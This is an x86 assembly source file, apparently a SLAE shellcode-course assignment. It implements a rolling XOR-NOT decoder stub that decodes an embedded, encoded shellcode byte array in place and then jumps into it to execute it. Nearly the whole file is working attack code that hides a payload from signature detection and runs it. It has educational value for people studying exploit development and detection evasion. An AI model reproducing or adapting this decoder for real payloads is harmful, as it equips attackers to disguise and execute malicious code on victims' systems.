;Author: John Stigerwalt
;SLAE: Assignment #4
;Website: slae.whiteknightlabs.com
;Shellcode: Iteration Rolling XOR NOT decoder

; Use with Perl "Iteration-Rolling-XOR-NOT-Encoder.pl" 
; 

global _start

section .text
_start:
    
    xor eax, eax
    cdq
    xor edi, edi
    push 0x1
    pop edi
    ;mov edi, 0x1      ; set counter for iteration - script sets this
    mov ah, 0xe5    ; last key set by script. will add or subtract for key change for n times iterations
    mov al, ah
    
loop_start:    
    
    jmp short call_decoder

decoder:

    pop esi
    push esi
    
    xor ebx, ebx
    xor ecx, ecx
    mov cl, len         ; Script will set length in hex, when done with objdump, "mov cl, len"  pulls in the length for you. very simple. 

decode:
    
    mov bl, [esi]   ; grab first byte of shellcode
    xor al, bl      ; xor operation of current key set and first byte of shellcode (XOR)
    not al
    mov [esi], al   ; store xored byte into esi. Replaces encoded shellcode with decoded shellcode byte by byte
    mov al, bl      ; move encoded byte into al for rolling xor 
    inc esi         ; move to next byte stored is ESI. 
    dec cl          ; loop counter
    cmp cl, dl      ; comapre with length of "Shellcode" and "0"
    jnz decode
    
    sub byte ah, 1  ; Change key with -1 per each iteration
    mov al, ah      ; 
  
    cmp edi, edx     ; iteration loop counter before execution
    jnz counter
  
  
    jmp short Shellcode  ; execute decoded shellcode
   
counter:

    dec edi
    jmp short loop_start
    
call_decoder:

    call decoder
    
    Shellcode: db 0x30,0xda,0x9f,0x4d,0x4f,0x9d,0xc3,0xa,0x54,0xda,0xc9,0x4c,0x58,0x3a,0x44,0x95,0x32,0x88,0x9e,0xfe,0x80,0xb1,0x74,0x83,0xb
    
    len:    equ $-Shellcode
